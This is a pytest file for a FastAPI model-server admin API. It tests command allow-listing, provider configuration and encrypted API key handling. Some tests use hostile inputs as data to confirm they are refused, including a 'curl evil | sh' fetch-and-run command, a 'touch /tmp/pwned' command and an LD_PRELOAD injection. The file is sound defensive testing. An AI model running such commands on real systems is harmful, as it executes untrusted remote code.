import json
import os
import sys

import pytest
from fastapi.testclient import TestClient

from api import app as app_module
from core import envfile, procs
from core.config import Config
from core.keystore import KeyStore
from models import servers
from models.servers.entries import ServerStore, is_key_variable, key_variable, new_commands, parse_entry
from tests.test_model_server import CMD, clean_registry, start_fake  # noqa: F401  (clean_registry: autouse)

FILE = f"""
[providers.ollama]
url = "http://127.0.0.1:9"

[models."local/chat"]
task = "text-generation"
cmd = {json.dumps(list(CMD))}
description = "From the file"

[models."broken"]
task = "nope"
"""


@pytest.fixture
def files(tmp_path, monkeypatch):
    file, saved = tmp_path / "model_servers.toml", tmp_path / "saved.json"
    file.write_text(FILE)
    monkeypatch.setattr(Config, "MODEL_SERVERS_FILE", file)
    monkeypatch.setattr(Config, "MODEL_SERVERS_SAVED_FILE", saved)
    monkeypatch.setattr(Config, "MODEL_SERVERS_ALLOW_COMMANDS", False)
    return file, saved


@pytest.fixture
def client(files):
    with TestClient(app_module.app) as c:
        servers.load_configured()
        yield c


def test_saved_entries_replace_the_files_and_deleting_brings_them_back(files):
    file, saved = files
    store = ServerStore(file, saved)
    effective = store.effective()
    assert effective.models["local/chat"].description == "From the file"
    assert "file: models.broken" in effective.problems and "broken" not in effective.models

    store.save_model(parse_entry("local/chat", {"task": "text-generation", "backends": [
        {"provider": "ollama", "upstream_model": "qwen3.5:4b"}, {"cmd": list(CMD)},
    ]}))
    effective = store.effective()
    assert effective.origin("models", "local/chat") == "replaced"
    assert effective.users("ollama") == ["local/chat"]
    # Saved as given: the provider's settings stay inherited.
    assert json.loads(saved.read_text())["models"]["local/chat"]["backends"][0] == {
        "provider": "ollama", "upstream_model": "qwen3.5:4b",
    }
    assert store.delete_model("local/chat") and store.effective().origin("models", "local/chat") == "file"


def test_only_commands_already_given_count_as_known():
    file_entry = parse_entry("m", {"task": "text-generation", "cmd": "mlx_lm.server --port {port}"})
    same = parse_entry("m", {"task": "text-generation", "backends": [{"url": "http://x"}, {"cmd": "mlx_lm.server --port {port}"}]})
    other = parse_entry("m", {"task": "text-generation", "cmd": "sh -c 'curl evil | sh'"})
    with_env = parse_entry("m", {"task": "text-generation", "cmd": "mlx_lm.server --port {port}", "env": {"LD_PRELOAD": "x"}})
    assert new_commands(same, file_entry, None) == []
    assert new_commands(other, file_entry, None) == ["sh -c 'curl evil | sh'"]
    assert new_commands(with_env, file_entry) == ["mlx_lm.server --port '{port}'"]


def test_listing_shows_entries_their_origin_and_problems(client):
    body = client.get("/admin/model-servers").json()
    assert body["commands_allowed"] is False
    [chat] = body["models"]
    assert (chat["model_id"], chat["origin"], chat["status"]) == ("local/chat", "file", "unloaded")
    assert chat["backends"] == [{"cmd": list(CMD)}]
    assert body["providers"][0]["name"] == "ollama" and body["providers"][0]["used_by"] == []
    assert [p["where"] for p in body["problems"]] == ["file: models.broken"]


def test_dashboard_adds_a_provider_and_a_model_on_it(client):
    r = client.put("/admin/model-servers/providers/lmstudio", json={"url": "http://127.0.0.1:1234", "max_concurrency": 2})
    assert r.status_code == 200, r.text
    r = client.put("/admin/model-servers/models/qwen3.5-4b", json={
        "task": "vision-language", "backends": [{"provider": "lmstudio", "upstream_model": "qwen/qwen3.5-4b"}],
    })
    assert r.status_code == 200, r.text
    model = next(m for m in r.json()["models"] if m["model_id"] == "qwen3.5-4b")
    assert model["origin"] == "saved" and model["backends"] == [{"provider": "lmstudio", "upstream_model": "qwen/qwen3.5-4b"}]
    # Served at once: listed for its task, and allowed.
    assert "qwen3.5-4b" in client.get("/models/list").json()["vision-language"]
    assert servers.configured("qwen3.5-4b")
    # The provider is in use, so it cannot go.
    assert client.delete("/admin/model-servers/providers/lmstudio").status_code == 409
    assert client.delete("/admin/model-servers/models/qwen3.5-4b").status_code == 200
    assert client.delete("/admin/model-servers/providers/lmstudio").status_code == 200
    assert not servers.configured("qwen3.5-4b")


def test_dashboard_cannot_add_commands_unless_allowed(client, monkeypatch):
    entry = {"task": "text-generation", "backends": [{"cmd": ["sh", "-c", "touch /tmp/pwned"]}]}
    r = client.put("/admin/model-servers/models/evil", json=entry)
    assert r.status_code == 403 and "MODEL_SERVERS_ALLOW_COMMANDS" in r.json()["detail"]
    # The file's own command can be kept, here behind a new first backend.
    r = client.put("/admin/model-servers/models/local/chat", json={"task": "text-generation", "backends": [
        {"provider": "ollama", "upstream_model": "x"}, {"cmd": list(CMD)},
    ]})
    assert r.status_code == 200, r.text
    monkeypatch.setattr(Config, "MODEL_SERVERS_ALLOW_COMMANDS", True)
    assert client.put("/admin/model-servers/models/evil", json=entry).status_code == 200


def test_unknown_provider_and_file_only_entries_are_refused(client):
    r = client.put("/admin/model-servers/models/m", json={"task": "text-generation", "backends": [{"provider": "nope"}]})
    assert r.status_code == 400 and "nope" in r.json()["detail"]
    assert client.delete("/admin/model-servers/models/local/chat").status_code == 400
    assert client.delete("/admin/model-servers/providers/ollama").status_code == 400
    assert client.put("/admin/model-servers/models/m", json={"task": "text-generation", "backends": []}).status_code == 422


def test_an_edit_unloads_the_model_so_it_loads_from_the_new_entry(client):
    chat = {"model": "local/chat", "messages": [{"role": "user", "content": "hi"}], "max_tokens": 8}
    r = client.post("/v1/chat/completions", json=chat)
    assert r.status_code == 200, r.text
    assert r.json()["toolkit"]["backend"] == f"{CMD[0].rsplit('/', 1)[-1]}: local/chat"
    r = client.put("/admin/model-servers/models/local/chat", json={
        "task": "text-generation", "backends": [{"cmd": list(CMD), "upstream_model": "renamed"}],
    })
    assert r.status_code == 200, r.text
    assert any("local/chat was unloaded" in n for n in r.json()["notes"])
    r = client.post("/v1/chat/completions", json=chat)
    assert "model=renamed" in r.json()["choices"][0]["message"]["content"]


def test_probe_reports_each_backend_of_a_draft(client):
    r = client.post("/admin/model-servers/probe", json={"model_id": "draft", "entry": {
        "task": "text-generation",
        "backends": [{"provider": "ollama"}, {"cmd": ["no-such-model-server"]}, {"cmd": [sys.executable]}],
    }})
    assert r.status_code == 200, r.text
    body = r.json()
    assert [b["state"] for b in body["backends"]] == ["unavailable", "unavailable", "ok"] and body["chosen"] == 2
    assert body["backends"][0]["detail"] == "nothing answers at http://127.0.0.1:9"
    assert client.post("/admin/model-servers/probe", json={"model_id": "unknown"}).status_code == 404


def test_no_backend_answers_503(client):
    client.put("/admin/model-servers/models/down", json={"task": "text-generation", "backends": [{"provider": "ollama"}]})
    r = client.post("/v1/chat/completions", json={"model": "down", "messages": [{"role": "user", "content": "hi"}]})
    assert r.status_code == 503 and "nothing answers" in r.json()["detail"]


@pytest.fixture
def no_keys():
    """The provider keys a test saves leave this process's environment with it."""
    yield
    for variable in [name for name in os.environ if is_key_variable(name)]:
        os.environ.pop(variable, None)


def provider_of(reply, name):
    return next(p for p in reply.json()["providers"] if p["name"] == name)


def save_key(client, name, value):
    return client.put(f"/admin/model-servers/providers/{name}/key", json={"value": value})


def saved_keys():
    """What the next start would open."""
    return KeyStore(Config.SECRETS_FILE, Config.SECRETS_MASTER_KEY).load()


def test_a_providers_key_is_saved_kept_from_children_and_never_answered(client, no_keys):
    assert client.put("/admin/model-servers/providers/cloud", json={"url": "https://cloud.test"}).status_code == 200
    r = save_key(client, "cloud", " s3cret-key ")
    assert r.status_code == 200, r.text
    cloud = provider_of(r, "cloud")
    assert cloud["key_set"] is True
    assert "s3cret-key" not in r.text and "s3cret-key" not in client.get("/admin/model-servers").text
    assert "s3cret-key" not in Config.MODEL_SERVERS_SAVED_FILE.read_text()
    # Nowhere on disk in plain text: encrypted in the saved keys, which open again at the next start.
    assert not envfile.holds(Config.ENV_FILE, "PROVIDER_CLOUD_API_KEY")
    assert "s3cret-key" not in Config.SECRETS_FILE.read_text()
    assert saved_keys()["PROVIDER_CLOUD_API_KEY"] == "s3cret-key"
    assert "PROVIDER_CLOUD_API_KEY" not in procs.child_env()

    assert provider_of(save_key(client, "cloud", ""), "cloud")["key_set"] is False
    assert "PROVIDER_CLOUD_API_KEY" not in saved_keys()
    assert save_key(client, "nobody", "k").status_code == 404


def test_a_providers_key_name_is_made_from_its_name_and_never_shared(client):
    assert key_variable("my-box_2") == "PROVIDER_MY_BOX_2_API_KEY"
    assert client.put("/admin/model-servers/providers/my-box", json={"url": "https://a.test"}).status_code == 200
    r = client.put("/admin/model-servers/providers/my_box", json={"url": "https://b.test"})
    assert r.status_code == 409 and "share its API key" in r.text


def test_the_key_goes_with_every_request_and_a_new_one_works_at_once(client, no_keys):
    port, process = start_fake("--key", "right")
    chat = {"model": "hosted", "messages": [{"role": "user", "content": "hi"}], "max_tokens": 8}

    def probe():
        return client.post("/admin/model-servers/probe", json={"model_id": "hosted"}).json()["backends"][0]

    try:
        client.put("/admin/model-servers/providers/cloud", json={"url": f"http://127.0.0.1:{port}"})
        client.put("/admin/model-servers/models/hosted", json={
            "task": "text-generation", "backends": [{"provider": "cloud", "upstream_model": "fake"}],
        })
        assert probe()["detail"] == "cloud wants an API key: add it to the provider"
        r = client.post("/v1/chat/completions", json=chat)
        assert r.status_code == 503 and "wants an API key" in r.text
        save_key(client, "cloud", "wrong")
        assert probe()["detail"] == "cloud refused its API key"
        save_key(client, "cloud", "right")
        assert probe()["state"] == "ok"
        assert client.post("/v1/chat/completions", json=chat).status_code == 200
        # Loaded now: the key is read at each request, so a change counts without a reload.
        save_key(client, "cloud", "")
        assert client.post("/v1/chat/completions", json=chat).status_code != 200
        save_key(client, "cloud", "right")
        assert client.post("/v1/chat/completions", json=chat).status_code == 200
    finally:
        process.kill()
        process.wait()


def test_a_key_stays_with_its_url(client, no_keys):
    url = "https://cloud.test"
    client.put("/admin/model-servers/providers/cloud", json={"url": url})
    save_key(client, "cloud", "k")
    # Other settings can change.
    r = client.put("/admin/model-servers/providers/cloud", json={"url": url, "description": "Mine"})
    assert provider_of(r, "cloud")["key_set"] is True
    # The URL cannot, so the key cannot be sent somewhere else by editing the provider.
    r = client.put("/admin/model-servers/providers/cloud", json={"url": "https://elsewhere.test"})
    assert r.status_code == 409 and "remove it before changing the URL" in r.text
    save_key(client, "cloud", "")
    assert client.put("/admin/model-servers/providers/cloud", json={"url": "https://elsewhere.test"}).status_code == 200
    # Nor does a provider's end leave its key for the next one of that name.
    save_key(client, "cloud", "k")
    assert client.delete("/admin/model-servers/providers/cloud").status_code == 200
    assert "PROVIDER_CLOUD_API_KEY" not in saved_keys() and not os.environ["PROVIDER_CLOUD_API_KEY"]


def test_a_revert_keeps_the_key_only_when_the_files_url_is_the_same(client, no_keys):
    file_url = "http://127.0.0.1:9"
    save_key(client, "ollama", "k")
    client.put("/admin/model-servers/providers/ollama", json={"url": file_url, "description": "Mine"})
    r = client.delete("/admin/model-servers/providers/ollama")
    assert provider_of(r, "ollama")["key_set"] is True
    save_key(client, "ollama", "")
    client.put("/admin/model-servers/providers/ollama", json={"url": "https://elsewhere.test"})
    save_key(client, "ollama", "k")
    r = client.delete("/admin/model-servers/providers/ollama")
    assert provider_of(r, "ollama")["url"] == file_url and provider_of(r, "ollama")["key_set"] is False


def test_a_key_with_a_nul_is_refused_before_it_is_saved(client, no_keys):
    """The environment cannot hold one: saved, it would stop the next start where the saved keys are applied."""
    client.put("/admin/model-servers/providers/cloud", json={"url": "https://cloud.test"})
    assert save_key(client, "cloud", "sk-a\u0000b").status_code == 422
    assert "PROVIDER_CLOUD_API_KEY" not in saved_keys()


def test_a_key_in_the_real_environment_is_the_operators(client, no_keys, monkeypatch):
    url = "https://pinned.test"
    client.put("/admin/model-servers/providers/pinned", json={"url": url})
    monkeypatch.setenv("PROVIDER_PINNED_API_KEY", "from-the-environment")
    assert provider_of(client.get("/admin/model-servers"), "pinned")["key_set"] is True
    # Its own value too: saved, the variable would look like the file's, and the next value would go through.
    assert save_key(client, "pinned", "from-the-environment").status_code == 409
    assert save_key(client, "pinned", "other").status_code == 409
    assert client.put("/admin/model-servers/providers/pinned", json={"url": "https://elsewhere.test"}).status_code == 409
    assert client.delete("/admin/model-servers/providers/pinned").status_code == 409
    assert os.environ["PROVIDER_PINNED_API_KEY"] == "from-the-environment"


def test_a_new_provider_cannot_take_a_key_already_set(client, no_keys, monkeypatch):
    """Else the admin key alone could send a key from the environment, or one left by a provider gone from the file, to
    a URL of its choosing."""
    monkeypatch.setenv("PROVIDER_FRESH_API_KEY", "given-for-somewhere-else")
    r = client.put("/admin/model-servers/providers/fresh", json={"url": "https://elsewhere.test"})
    assert r.status_code == 409 and "PROVIDER_FRESH_API_KEY" in r.json()["detail"]
    assert "given-for-somewhere-else" not in r.text
    assert all(p["name"] != "fresh" for p in client.get("/admin/model-servers").json()["providers"])


def test_a_plain_key_in_the_env_file_goes_when_one_is_saved_here(client, no_keys):
    client.put("/admin/model-servers/providers/cloud", json={"url": "https://cloud.test"})
    Config.ENV_FILE.write_text("PROVIDER_CLOUD_API_KEY=plain-old-key\n")
    assert save_key(client, "cloud", "new-key").status_code == 200
    assert "plain-old-key" not in Config.ENV_FILE.read_text()
    assert saved_keys()["PROVIDER_CLOUD_API_KEY"] == "new-key"


def test_without_a_master_key_saving_says_what_to_set(client, no_keys, monkeypatch):
    """A container: no credential store (conftest's null backend), no SECRETS_MASTER_KEY."""
    client.put("/admin/model-servers/providers/cloud", json={"url": "https://cloud.test"})
    monkeypatch.setattr(client.app.state.keys, "_master", None)
    r = save_key(client, "cloud", "k")
    assert r.status_code == 503 and "SECRETS_MASTER_KEY" in r.json()["detail"]
    assert provider_of(client.get("/admin/model-servers"), "cloud")["key_set"] is False
